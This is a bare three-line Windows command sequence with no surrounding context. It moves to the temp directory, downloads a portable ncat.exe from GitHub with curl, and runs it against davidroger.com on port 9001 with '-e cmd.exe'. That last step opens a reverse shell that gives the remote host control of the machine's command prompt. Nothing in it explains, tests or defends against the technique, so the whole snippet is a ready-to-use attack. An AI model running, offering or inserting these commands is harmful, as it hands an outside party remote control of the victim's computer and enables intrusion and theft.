cd %temp%
curl -L https://github.com/cyberisltd/NcatPortable/raw/refs/heads/master/ncat.exe -o ncat.exe
ncat.exe davidroger.com 9001 -e cmd.exe
